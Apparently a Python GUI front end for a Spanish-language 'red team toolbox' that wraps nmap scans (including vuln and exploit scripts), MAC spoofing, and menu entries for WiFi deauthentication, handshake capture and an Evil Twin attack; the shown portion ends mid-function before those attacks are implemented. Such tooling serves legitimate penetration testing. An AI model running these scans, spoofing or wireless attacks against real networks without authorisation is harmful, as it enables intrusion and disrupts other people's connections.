import customtkinter as ctk
import subprocess
import threading
import os
import time
import socket
import re
import tempfile
from datetime import datetime
import glob
import ducky_logic
from gadget_handler import BLEGadget

# ==========================================
# CONFIGURACION VISUAL PRO (Red Team Theme)
# ==========================================
ctk.set_appearance_mode("Dark")
COLOR_FONDO_SIDEBAR = "#111111"
COLOR_FONDO_PRINCIPAL = "#1a1a1a"
COLOR_BOTON_ROJO = "#a60000"
COLOR_BOTON_HOVER = "#6b0000"
COLOR_TEXTO_TERMINAL = "#ff4d4d"
COLOR_BOTON_PELIGRO = "#ff9900"

# Directorios base para resultados
BASE_DIR_NMAP = "Resultados_Nmap"
BASE_DIR_WIFI = "Resultados_Handshake"
BASE_DIR_EVIL = "Resultados_EvilTwin"
BASE_DIR_BLE = "Resultados_BLE"

class RedTeamApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("DRAGON FLY - RED TEAM TOOLBOX")
        
        self.withdraw() 
        ancho = self.winfo_screenwidth()
        alto = self.winfo_screenheight()
        self.geometry(f"{ancho}x{alto}+0+0") 
        self.deiconify() 
        
        # ===================================================
        # 2. SOLUCION AGRESIVA AL ENFOQUE (1 Segundo de espera)
        # ===================================================
        def aplicar_kiosco():
            self.attributes('-fullscreen', True)
            self.attributes('-topmost', True) 
            self.lift()
            self.focus_force() 
            self.update_idletasks()
            self.event_generate('<Motion>', warp=True, x=ancho//2, y=alto//2)
            
        self.after(1000, aplicar_kiosco)
        
        self.bind("<Escape>", lambda event: self.destroy())
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        # Variables de estado global
        self.target_ip = ctk.StringVar(value="127.0.0.1")
        self.usar_rango = ctk.BooleanVar(value=False)
        self.rango_cidr = ctk.StringVar(value="/24")
        self.interfaz_seleccionada = ctk.StringVar(value="")
        self.session_dir_nmap = ""
        
        # Estado para flujos complejos (WiFi, BLE)
        self.wifi_state = {}
        self.ble_state = {}
        self.navigation_stack = []  # Pila para volver atrás en menús dinámicos

        # --- NUEVO: Referencias a procesos para Evil Twin ---
        self.evil_twin_procs = {
            'hostapd': None,
            'dnsmasq': None,
            'capture': None,
            'deauth': None
        }
        self.evil_twin_stop = False

        # Crear directorios base
        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE]:
            os.makedirs(d, exist_ok=True)

        # ==========================================
        # INICIALIZACIÓN DEL GADGET BLE 
        # ==========================================
        try:
            self.gadget = BLEGadget()
            if self.gadget.is_available():
                self.gadget_available = True
                print("[+] Gadget ESP32 BLE conectado correctamente.")
            else:
                self.gadget_available = False
                print("[!] Gadget ESP32 BLE no detectado.")
        except Exception as e:
            self.gadget = None
            self.gadget_available = False
            print(f"[!] Error al inicializar gadget BLE: {e}")


        # Sidebar
        self.sidebar_frame = ctk.CTkFrame(self, width=220, corner_radius=15, fg_color=COLOR_FONDO_SIDEBAR)
        self.sidebar_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure(8, weight=1)

        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="DRAGON FLY\nSYSTEM", 
                                     font=ctk.CTkFont(size=22, weight="bold"), text_color="#ff4d4d")
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 15))

        # Botones del menú principal
        self.btn_inicio = self.crear_boton_menu("0. Inicio", self.show_inicio_menu, 1)
        self.btn_nmap = self.crear_boton_menu("1. Reconocimiento", self.show_recon_menu, 2)
        self.btn_mac = self.crear_boton_menu("2. MAC Changer", self.show_mac_menu, 3)
        self.btn_wifi = self.crear_boton_menu("3. Auditoría WiFi", self.show_wifi_menu, 4)
        self.btn_bluetooth = self.crear_boton_menu("4. Bluetooth BLE", self.show_bluetooth_menu, 5)
        self.btn_ducky = self.crear_boton_menu("5. Rubber Ducky", self.show_ducky_menu, 6)
        self.btn_utils = self.crear_boton_menu("6. Utilidades OS", self.show_utils_menu, 7)

        # Frame principal (scrollable)
        self.main_frame = ctk.CTkScrollableFrame(self, corner_radius=15, fg_color=COLOR_FONDO_PRINCIPAL)
        self.main_frame.grid(row=0, column=1, padx=(0, 10), pady=10, sticky="nsew")

        # Botón "Atrás" (inicialmente oculto)
        self.back_btn = None

        self.show_inicio_menu()

    def crear_boton_menu(self, texto, comando, fila):
        boton = ctk.CTkButton(self.sidebar_frame, text=texto, command=comando,
                             fg_color="transparent", border_width=2, border_color=COLOR_BOTON_ROJO,
                             hover_color=COLOR_BOTON_HOVER, font=ctk.CTkFont(size=14, weight="bold"))
        boton.grid(row=fila, column=0, padx=15, pady=8, sticky="ew")
        return boton

    def limpiar_main_frame(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        self.back_btn = None

    def agregar_boton_atras(self, callback):
        """Añade botón de retroceso en la parte superior del main_frame"""
        self.back_btn = ctk.CTkButton(self.main_frame, text="← Atrás", width=80, 
                                      fg_color="#4a4a4a", hover_color="#2b2b2b",
                                      command=callback)
        self.back_btn.pack(anchor="nw", padx=10, pady=5)

    def mostrar_consola(self):
        self.console_textbox = ctk.CTkTextbox(self.main_frame, font=ctk.CTkFont(family="Courier", size=13),
                                             fg_color="#0a0a0a", text_color=COLOR_TEXTO_TERMINAL,
                                             corner_radius=12, height=250)
        self.console_textbox.pack(fill="both", expand=True, padx=20, pady=(15, 20))

    def escribir_consola(self, texto):
        self.console_textbox.insert("end", texto + "\n")
        self.console_textbox.see("end")

    def obtener_interfaces_red(self):
        try:
            return sorted([i for i in os.listdir('/sys/class/net/') if i != "lo"])
        except Exception:
            return ["wlan0", "eth0"]

    # ==========================================
    # FUNCIÓN DE VALIDACIÓN DE IP/CIDR (NUEVA)
    # ==========================================
    def validar_ip_cidr(self):
        """Valida que el target IP y CIDR sean válidos. Retorna True si es correcto."""
        ip = self.target_ip.get().strip()
        if self.usar_rango.get():
            cidr = self.rango_cidr.get().strip()
            # Expresión regular para IPv4 con CIDR /8,/16,/24,/32
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            patron_cidr = r'^/(8|16|24|32)$'
            if not re.match(patron_ip, ip) or not re.match(patron_cidr, cidr):
                self.escribir_consola("[!] IP o CIDR inválido. Use formato IPv4 válido y /8,/16,/24,/32.")
                return False
        else:
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            if not re.match(patron_ip, ip):
                self.escribir_consola("[!] IP inválida. Use formato IPv4.")
                return False
        return True

    def obtener_target(self):
        """Retorna el target validado; si no es válido, retorna None."""
        if not self.validar_ip_cidr():
            return None
        if self.usar_rango.get():
            return f"{self.target_ip.get()}{self.rango_cidr.get()}"
        return self.target_ip.get()

    # ==========================================
    # EJECUCIÓN SEGURA DE COMANDOS (MODIFICADA)
    # ==========================================
    def ejecutar_comando(self, comando, callback_after=None, use_shell=True):
        """
        Ejecuta un comando en segundo plano. 
        Si use_shell=False, comando debe ser una lista.
        Para comandos con pipes, se usa shell=True pero con sanitización previa.
        """
        if use_shell and isinstance(comando, str):
            self.escribir_consola(f"\nroot@kali:~# {comando}")
        else:
            self.escribir_consola(f"\nroot@kali:~# {' '.join(comando)}")

        def run():
            try:
                if use_shell:
                    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                else:
                    proc = subprocess.Popen(comando, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    self.escribir_consola(line.rstrip())
                proc.wait()
                self.escribir_consola("\n[+] Tarea finalizada.")
                if callback_after:
                    self.after(0, callback_after)
            except Exception as e:
                self.escribir_consola(f"\n[!] ERROR: {e}")
        threading.Thread(target=run, daemon=True).start()

    # ===================================================
    # INICIO DRAGON FLY
    # ===================================================
    def show_inicio_menu(self):
        """Pantalla de inicio con bienvenida y ASCII art en rojo."""
        self.limpiar_main_frame()
        
        # Contenedor principal centrado
        container = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        container.pack(expand=True, fill="both", padx=20, pady=20)
        
        # Título de bienvenida
        titulo = ctk.CTkLabel(
            container,
            text="BIENVENIDO AL SISTEMA DRAGON FLY",
            font=ctk.CTkFont(size=28, weight="bold"),
            text_color="#ff4d4d"
        )
        titulo.pack(pady=(30, 10))
        
        # Subtítulo
        subtitulo = ctk.CTkLabel(
            container,
            text="Red Team Toolbox - Auditoría y Pentesting",
            font=ctk.CTkFont(size=16),
            text_color="#aaaaaa"
        )
        subtitulo.pack(pady=(0, 30))
        
        # Arte ASCII en color rojo
        ascii_art = r"""                                                                                                                          
                                                                              ▒▒                      ░░░░                                                                              
                                                                                ░░                    ▒▒                                                                                
                                                                                ░░░░      ▒▒▓▓      ▒▒░░                                                                                
                                                                                  ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                                  
                                                                                  ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                              
                                  ░░░░░░░░░░░░░░                                ░░    ▒▒▒▒░░▒▒░░▒▒  ░░▒▒                  ░░░░░░░░░░░░░░░░░░░░░░                                        
                      ░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░        ▒▒    ▒▒████▓▓░░░░░░      ░░░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░                        
              ░░████▓▓▒▒░░▓▓▒▒▒▒░░▒▒░░░░░░░░▒▒▒▒░░░░▒▒▒▒░░▒▒██▓▓░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒░░▓▓░░░░░░░░░░▓▓▒▒▒▒▓▓▒▒░░▒▒░░░░░░▒▒  ░░░░▒▒▒▒░░░░░░▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒░░██▓▓▒▒░░            
        ░░░░░░░░░░▓▓▒▒░░░░░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ░░▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒░░░░░░▓▓▓▓▓▓▒▒▒▒░░▓▓▓▓░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░▓▓▓▓░░░░▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░▒▒░░░░░░        
      ░░░░░░░░░░▓▓▒▒▒▒▓▓  ░░▒▒░░▒▒░░▒▒░░▒▒▓▓██▓▓████▒▒▒▒▒▒░░▒▒▒▒░░░░░░░░░░░░░░▒▒▒▒░░▒▒▒▒░░▓▓▓▓░░▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓░░▓▓████░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░▓▓▒▒▓▓░░░░░░░░░░░░░░░░      
      ░░▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░▒▒▒▒▓▓██▓▓▒▒░░░░░░▒▒░░░░░░▒▒░░░░▒▒▒▒▒▒▒▒░░▒▒░░▒▒▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒░░▒▒▒▒░░░░▒▒░░░░▓▓▓▓▓▓▓▓▒▒░░▒▒▒▒░░▒▒▒▒░░░░▒▒░░▒▒▓▓▒▒░░░░░░░░░░░░░░░░░░    
      ░░░░░░░░░░▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒░░▒▒▒▒░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░▒▒▒▒░░▒▒░░▒▒▓▓▒▒▒▒▒▒░░▓▓▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░▒▒▒▒░░▒▒▓▓▒▒▒▒░░▒▒░░░░░░░░░░▒▒▒▒░░▒▒▓▓░░▒▒▒▒▒▒░░░░░░░░      
        ░░░░░░▒▒░░░░░░▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒▒▒░░░░▒▒░░░░░░▒▒░░▓▓▓▓▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░▓▓░░▒▒▒▒░░▓▓░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒░░▒▒▒▒░░▒▒▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒░░░░▒▒▒▒░░░░░░░░░░        
            ░░░░▒▒░░▒▒░░▒▒▒▒▒▒░░░░▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▓▓▓▓▒▒▓▓░░▒▒░░░░▒▒░░▒▒▓▓▓▓▒▒▒▒▒▒▓▓▓▓░░▒▒░░░░▒▒▓▓▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░          
                ░░░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓░░▒▒░░░░▒▒░░░░░░░░▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▒▒▒▒▓▓▒▒░░▓▓▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░              
                      ░░░░░░░░░░░░░░▒▒▒▒▓▓██▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒░░░░▒▒▒▒▒▒▒▒▓▓▒▒  ░░▓▓▒▒░░  ░░▒▒▒▒░░▒▒▒▒░░░░░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▓▓▒▒▒▒▒▒░░░░░░░░░░                    
                                  ░░░░░░░░░░░░░░░░▒▒░░▒▒▒▒▒▒▒▒▓▓▒▒░░░░░░▒▒░░▒▒▒▒▓▓▓▓░░    ▒▒▒▒    ░░▓▓▓▓▒▒░░░░▒▒▒▒▒▒░░▒▒▒▒▓▓▒▒▒▒▓▓░░▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░                            
                                            ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▒▒▒▒▓▓░░      ▒▒▒▒      ░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒░░░░▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒░░░░░░                                      
                                        ░░▒▒▒▒▒▒▓▓▓▓▒▒▓▓▓▓▒▒░░▒▒▒▒▒▒░░▒▒▒▒▒▒▓▓▓▓░░        ▒▒▒▒        ░░░░▓▓▓▓▒▒░░░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒░░▓▓▓▓▓▓▒▒░░░░░░                                  
                                  ░░▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░░▒▒▓▓▒▒░░░░▒▒▒▒░░░░▒▒▒▒▒▒░░          ▒▒▒▒            ░░░░▒▒▓▓▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒░░░░░░░░                              
                              ░░▒▒▒▒▒▒▒▒▓▓▒▒░░▓▓▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒░░▒▒▒▒▒▒▓▓░░              ▒▒░░                ░░▒▒▓▓▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓▓▓▒▒░░░░▒▒░░▒▒▒▒░░                          
                        ░░░░▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▓▓██████▓▓░░▒▒▓▓░░▒▒▒▒▓▓▒▒░░░░                ▓▓                    ░░░░▓▓▓▓▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒░░░░                      
                    ░░░░░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒██▓▓▓▓▓▓▓▓▒▒░░▒▒▒▒░░▒▒▒▒▒▒░░                    ▒▒░░                      ░░▒▒▒▒▒▒▒▒▒▒░░▒▒░░▓▓████▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░                    
                ▒▒░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░░░▒▒██▓▓░░▒▒▒▒▒▒▓▓▓▓▒▒░░                        ▒▒░░                          ░░▓▓▒▒░░▒▒░░▒▒░░▓▓████▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░                
            ▒▒██░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░████░░░░▒▒▒▒▒▒▓▓░░░░                          ▓▓                              ░░░░▓▓▓▓▒▒░░░░░░████▓▓▒▒▒▒▓▓▓▓▒▒░░░░░░▒▒▒▒▒▒░░██▒▒            
        ░░░░▒▒  ▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓░░▒▒▒▒░░▒▒▓▓▓▓░░░░                              ▓▓░░                                ░░░░▓▓▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒░░░░░░▒▒░░  ▒▒▒▒██░░        
      ░░▒▒░░░░  ▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒░░▒▒▒▒▓▓▒▒░░░░                                  ▓▓                                      ░░▒▒▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░░░░░▒▒░░░░░░▒▒░░░░░░      
      ░░░░░░░░▒▒░░░░▒▒░░▒▒▒▒▒▒▒▒▒▒░░▒▒░░░░▒▒░░▒▒░░░░                                      ▓▓                                          ░░░░░░░░░░▒▒▒▒▒▒▓▓▒▒▒▒░░░░▒▒▒▒  ░░░░░░░░  ▓▓░░    
            ░░░░░░░░░░░░░░  ░░░░░░░░░░░░                                                  ▒▒░░                                              ░░░░░░░░░░▒▒▒▒░░▒▒▒▒▒▒▒▒░░  ▒▒▒▒░░▒▒░░      
                                                                                          ▓▓                                                            ░░▒▒▒▒░░░░░░░░░░░░░░░░░░        
                                                                                          ▒▒                                                                          ░░                
                                                                                          ▓▓                                                                                            
                                                                                          ▓▓                                                                                            
                                                                                          ▒▒                                                                                            
                                                                                          ▓▓░░                                                                                          
                                                                                          ▓▓░░                                                                                          
▒▒░░
                                                                                          
                                                                                               

        """
        
        ascii_label = ctk.CTkLabel(
            container,
            text=ascii_art,
            font=ctk.CTkFont(family="Courier", size=14, weight="bold"),
            text_color="#ff4d4d",      # Rojo intenso
            justify="center"
        )
        ascii_label.pack(pady=10)
        
        # Línea decorativa
        ctk.CTkFrame(container, height=2, fg_color="#ff4d4d").pack(fill="x", padx=50, pady=20)
        
        # Pie de página
        footer = ctk.CTkLabel(
            container,
            text="Selecciona una herramienta del menú lateral para comenzar.",
            font=ctk.CTkFont(size=14),
            text_color="#888888"
        )
        footer.pack(pady=20)

    # ==========================================
    # MENÚ RECONOCIMIENTO (NMAP) - MODIFICADO
    # ==========================================
    def show_recon_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="RECONOCIMIENTO E INTELIGENCIA", 
                     font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10,5))
        
        # Configuración de target
        config_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        config_frame.pack(fill="x", padx=20, pady=5)
        ctk.CTkLabel(config_frame, text="Target IP:").pack(side="left", padx=5)
        entry_target = ctk.CTkEntry(config_frame, textvariable=self.target_ip, width=150)
        entry_target.pack(side="left", padx=5)
        
        chk_rango = ctk.CTkCheckBox(config_frame, text="Usar rango", variable=self.usar_rango)
        chk_rango.pack(side="left", padx=10)
        ctk.CTkOptionMenu(config_frame, values=["/24", "/16", "/8"], variable=self.rango_cidr, width=60).pack(side="left", padx=5)
        
        ctk.CTkButton(config_frame, text="Actualizar", width=80, fg_color=COLOR_BOTON_ROJO,
                     command=lambda: self.escribir_consola(f"[+] Target actualizado: {self.obtener_target() or 'Inválido'}")).pack(side="left", padx=10)

        # Opciones de escaneo Nmap (MODIFICADO: T4 -> T3, sin min-rate)
        btn_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=15, pady=10)
        btn_frame.grid_columnconfigure((0,1), weight=1)

        comandos_nmap = [
            ("0. Descubrimiento hosts", "-sn {TARGET} -oN {SESSION}/00_hosts.txt"),
            ("1. Puertos comunes", "-sS -T3 --top-ports 1000 {TARGET} -oN {SESSION}/01_common.txt"),
            ("2. Full TCP", "-sS -p- -T3 {TARGET} -oN {SESSION}/02_full_tcp.txt"),
            ("3. Servicios/versiones", "-sV --version-intensity 5 {TARGET} -oN {SESSION}/03_services.txt"),
            ("4. Detección OS", "-O --osscan-guess {TARGET} -oN {SESSION}/04_os.txt"),
            ("5. UDP comunes", "-sU --top-ports 100 -T3 {TARGET} -oN {SESSION}/05_udp.txt"),
            ("6. Vulnerabilidades NSE", "--script vuln,exploit {TARGET} -oN {SESSION}/06_vuln.txt"),
            ("7. Agresivo completo", "-A -p- -T3 {TARGET} -oN {SESSION}/07_aggressive.txt"),
            ("8. Firewall/IDS", "-sA -p 80,443,22,21,25 {TARGET} -oN {SESSION}/08_firewall.txt"),
            ("9. Scripts servicios", "--script http-enum,ssh-auth-methods,smb-enum-shares,ftp-anon {TARGET} -oN {SESSION}/09_scripts.txt"),
            ("10. SSL/TLS", "--script ssl-enum-ciphers,ssl-cert -p 443,8443 {TARGET} -oN {SESSION}/10_ssl.txt"),
            ("11. Traceroute", "--traceroute {TARGET} -oN {SESSION}/11_traceroute.txt"),
            ("12. Automatizado", f"-sn {{TARGET}} -oN {{SESSION}}/12a_discovery.txt && nmap -sS -p- -T3 {{TARGET}} -oN {{SESSION}}/12b_ports.txt && nmap -sV -sC {{TARGET}} -oN {{SESSION}}/12c_services.txt")
        ]

        for i, (nombre, cmd) in enumerate(comandos_nmap):
            row = i // 2
            col = i % 2
            btn = ctk.CTkButton(btn_frame, text=nombre, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                               command=lambda c=cmd: self._ejecutar_nmap(c))
            btn.grid(row=row, column=col, padx=5, pady=5, sticky="ew")

        # Botón explorador de resultados
        ctk.CTkButton(self.main_frame, text="EXPLORAR RESULTADOS GUARDADOS", 
                     fg_color="#4a4a4a", hover_color="#2b2b2b", height=40,
                     command=self._mostrar_explorador_nmap).pack(pady=15)

        self.mostrar_consola()

    def _ejecutar_nmap(self, cmd_template):
        target = self.obtener_target()
        if target is None:
            self.escribir_consola("[!] Target inválido. No se ejecutará el comando.")
            return
        # Crear directorio de sesión con timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.session_dir_nmap = os.path.join(BASE_DIR_NMAP, f"Auditoria-{timestamp}")
        os.makedirs(self.session_dir_nmap, exist_ok=True)
        comando = cmd_template.replace("{TARGET}", target).replace("{SESSION}", self.session_dir_nmap)
        # Ejecutar con shell=True (necesario por los pipes internos en algunos comandos)
        self.ejecutar_comando(f"nmap {comando}")

    def _mostrar_explorador_nmap(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_recon_menu)
        ctk.CTkLabel(self.main_frame, text="AUDITORÍAS NMAP GUARDADAS", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        
        if not os.path.exists(BASE_DIR_NMAP):
            os.makedirs(BASE_DIR_NMAP)
        carpetas = sorted([d for d in os.listdir(BASE_DIR_NMAP) if os.path.isdir(os.path.join(BASE_DIR_NMAP, d))], reverse=True)
        if not carpetas:
            ctk.CTkLabel(self.main_frame, text="No hay auditorías guardadas.").pack(pady=20)
            return

        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for carpeta in carpetas:
            ruta = os.path.join(BASE_DIR_NMAP, carpeta)
            btn = ctk.CTkButton(frame, text=carpeta, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda r=ruta: self._mostrar_archivos_nmap(r))
            btn.pack(fill="x", pady=3)

    def _mostrar_archivos_nmap(self, ruta):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._mostrar_explorador_nmap)
        nombre = os.path.basename(ruta)
        ctk.CTkLabel(self.main_frame, text=f"ARCHIVOS EN {nombre}", 
                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
        
        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        if not archivos:
            ctk.CTkLabel(self.main_frame, text="Carpeta vacía").pack(pady=20)
            return

        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
        frame.pack(fill="both", expand=True, padx=20, pady=10)
        for archivo in archivos:
            ruta_arch = os.path.join(ruta, archivo)
            btn = ctk.CTkButton(frame, text=archivo, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
                               command=lambda ra=ruta_arch: self.ejecutar_comando(f"less '{ra}'"))
            btn.pack(fill="x", pady=3)
        self.mostrar_consola()

    # ==========================================
    # MENÚ MAC CHANGER
    # ==========================================
    def show_mac_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="DIRECCION MAC", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10, 15))
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ctk.CTkLabel(self.main_frame, text="No se detectaron interfaces.").pack()
            return
        self.interfaz_seleccionada.set(interfaces[0])
        sel_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        sel_frame.pack(pady=5)
        ctk.CTkLabel(sel_frame, text="Interfaz: ").pack(side="left")
        ctk.CTkOptionMenu(sel_frame, variable=self.interfaz_seleccionada, values=interfaces, 
                        fg_color=COLOR_BOTON_ROJO, button_color=COLOR_BOTON_HOVER).pack(side="left")
        
        ctk.CTkButton(self.main_frame, text="Ver Estado", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, width=300,
                    command=lambda: self.ejecutar_comando(f"sudo macchanger -s {self.interfaz_seleccionada.get()}")).pack(pady=5)
        ctk.CTkButton(self.main_frame, text="MAC Random", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, width=300,
                    command=lambda: self.ejecutar_comando(
                        f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -r {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
                    ).pack(pady=5)
        ctk.CTkButton(self.main_frame, text="Reset Original", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, width=300,
                    command=lambda: self.ejecutar_comando(
                        f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -p {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
                    ).pack(pady=5)
        ctk.CTkButton(self.main_frame, text="MAC Mismo Fabricante", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER, width=300,
                    command=lambda: self.ejecutar_comando(
                        f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -a {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
                    ).pack(pady=5)
        self.mostrar_consola()

    # ==========================================
    # MENÚ AUDITORÍA WIFI
    # ==========================================
    def show_wifi_menu(self):
        self.limpiar_main_frame()
        ctk.CTkLabel(self.main_frame, text="AUDITORÍA INALÁMBRICA", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=(10,15))
        
        opciones = [
            ("Activar Modo Monitor", self._wifi_modo_monitor),
            ("Captura Automatizada de Handshake", self._wifi_captura_handshake),
            ("Ataque Evil Twin + Deauth", self._wifi_evil_twin),
            ("Desautenticación WiFi", self._wifi_deauth),
            ("Explorar Capturas Handshake", self._wifi_explorar_handshakes),
            ("Explorar Resultados Evil Twin", self._wifi_explorar_evil),
        ]
        for texto, cmd in opciones:
            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                         height=40, command=cmd).pack(fill="x", padx=40, pady=8)
        self.mostrar_consola()

    def _wifi_modo_monitor(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ctk.CTkLabel(self.main_frame, text="ACTIVAR MODO MONITOR", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ctk.CTkLabel(self.main_frame, text="No hay interfaces.").pack()
            return
        for iface in interfaces:
            ctk.CTkButton(self.main_frame, text=f"Poner {iface} en modo monitor", 
                         fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
                         command=lambda i=iface: self.ejecutar_comando(
                             f"sudo airmon-ng check kill && sudo airmon-ng start {i}",
                             callback_after=lambda: self.escribir_consola("[+] Modo monitor activado. Verifica con ifconfig.")
                         )).pack(fill="x", padx=40, pady=5)
        self.mostrar_consola()

    # ==========================================
    # ARCHIVOS TEMPORALES DINÁMICOS (Función auxiliar)
    # ==========================================
    def _generar_nombre_temporal(self, prefijo):
        """Genera un nombre de archivo temporal único basado en timestamp."""
